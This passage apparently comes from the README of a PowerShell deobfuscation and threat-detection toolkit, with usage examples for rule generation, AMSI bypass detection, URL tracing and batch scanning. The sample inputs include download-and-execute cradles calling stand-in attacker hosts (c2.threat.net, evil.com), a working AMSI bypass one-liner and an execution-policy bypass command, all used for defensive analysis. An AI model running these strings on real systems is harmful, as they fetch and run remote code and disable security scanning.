script = "(New-Object Net.WebClient).DownloadString('http://c2.threat.net/stage.ps1') | IEX"

# Generate YARA 4.x rule
yara_rule = engine.generate_yara_rule(script)
print(yara_rule)

# Generate SigmaHQ YAML rule (ScriptBlock Logging EID 4104)
sigma_rule = engine.generate_sigma_rule(script)
print(sigma_rule)

# Generate full ruleset bundle with indicator extraction telemetry
ruleset = engine.generate_threat_rules(script)
print(f"Total Indicators: {ruleset['summary']['total_indicators']}, Severity: {ruleset['summary']['severity']}")

# 3. Recursive IEX Peeling & Layer Telemetry
result = unwrap_iex("iex (iex (iex 'calc.exe'))")
print(f"Peeled: {result.code}, Layers: {result.total_layers_peeled}")
# Output: Peeled: 'calc.exe', Layers: 3

# 4. AMSI & ETW Bypass Detection and Neutralization
findings = detect_amsi_etw("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
for f in findings:
    print(f"[{f.severity}] {f.signature_id}: {f.signature_name} ({f.target_symbol})")

sanitized = neutralize_amsi_etw(raw_code, mode="comment")

# 5. Automated Benchmark Harness Execution
summary = run_benchmark()
print(f"Fidelity Score: {summary.average_fidelity_score}%, Recall: {summary.average_indicator_recall * 100.0}%")
print(to_text_report(summary))

# 6. Remote Payload URL Carving & WebClient Tracing
targets = trace_webclient("(New-Object Net.WebClient).DownloadString('http://2130706433:8080/beacon.ps1')")
for t in targets:
    print(f"URL: {t.url}, Host: {t.host}, IP Decoded: {t.ip_decoded}, Cradle: {t.cradle_type}")
# Output: URL: http://127.0.0.1:8080/beacon.ps1, Host: 127.0.0.1, IP Decoded: 2130706433 -> 127.0.0.1, Cradle: iex_download_string

# 7. AST Visualization
tree = render_ast_tree("$x = 'test' + 'ing'")
print(tree)

# 8. Export to Mermaid diagram
mermaid_diagram = export_ast_mermaid("if ($true) { Get-Process }")
print(mermaid_diagram)

# 9. Extract structural metrics
metrics = extract_ast_metrics("Get-Process | Out-String")
print(f"Total nodes: {metrics['total_nodes']}, Cyclomatic complexity: {metrics['cyclomatic_complexity']}")

# 10. In-Memory Compressed Stream Decompression
compressed_payload = "(New-Object IO.StreamReader(New-Object IO.Compression.GZipStream(New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAEAEvMS8kvKlEoycgsVgIA8aGg4wsAAAA=')), 1))).ReadToEnd()"
unpacked_code = engine.deobfuscate(compressed_payload)
print(unpacked_code)  # 'Hello Decompressed World'
print(f"Decompressed {len(engine.last_compression_layers)} stream layers")

# 11. Variable Scope Chain & Lifecycle Analysis
from src.variable_scope import analyze_scopes, to_scope_report
scope_summary = analyze_scopes("$global:url = 'http://evil.com/drop.exe'; & { $x = $global:url; iex $x }")
print(to_scope_report(scope_summary))
print(f"Total Scopes: {scope_summary.total_scopes}, Constant Candidates: {scope_summary.constant_candidates_count}")

# 12. Runtime ExecutionPolicy Simulation & Neutralization
from src.execution_policy import simulate_execution_policy, to_policy_report, parse_cli_policy_args
policy_summary = simulate_execution_policy("$env:PSExecutionPolicyPreference = 'Bypass'")
print(to_policy_report(policy_summary))
print(f"Bypass Detected: {policy_summary.bypass_detected}, Effective: {policy_summary.final_effective.value}")

cli_info = parse_cli_policy_args("powershell.exe -ExecutionPolicy Bypass -File payload.ps1")
print(f"CLI Policy: {cli_info['execution_policy'].value}, Is Bypass: {cli_info['is_bypass']}")

# 13. Regression Stress Fuzzing & Mutation Testing
from src.fuzzing import run_fuzz_harness, to_text_report
fuzz_summary = run_fuzz_harness(iterations=25, seed=42)
print(to_text_report(fuzz_summary))
print(f"Safety Pass Rate: {fuzz_summary.pass_rate}%, Unexpected Crashes: {fuzz_summary.unexpected_crashes}")

# 14. Batch Forensic Directory & File Scanning
from src.batch import scan_directory, scan_files, BatchScanOptions, RiskTier
batch_summary = scan_directory(
    "./samples",
    max_workers=8,
    export_deobfuscated=True,
    output_dir="./deobfuscated_out",
    export_iocs=True,
    min_risk=RiskTier.SUSPICIOUS,
)
print(f"Scanned: {batch_summary.total_files_scanned}, Malicious: {batch_summary.malicious_count}")
print(batch_summary.to_text_table())

# 15. PowerShell 7+ Operator Folding & Dead Code Elimination
from src.pwsh7 import fold_pwsh7_operators, is_statically_truthy, is_statically_null
pwsh7_code = "$res = (1 -eq 1) ? ('i' + 'ex') : 'exit'; $cfg = $null ?? 'default_setting'"
cleaned_pwsh7 = engine.deobfuscate(pwsh7_code)
print(cleaned_pwsh7)
# Output: $res = 'iex'; $cfg = 'default_setting'
```

---

## 📜 License

This project is licensed under the **Maya Thorne Systems &amp; Security Research License (MT-SRL)**. See [LICENSE](LICENSE) for details.
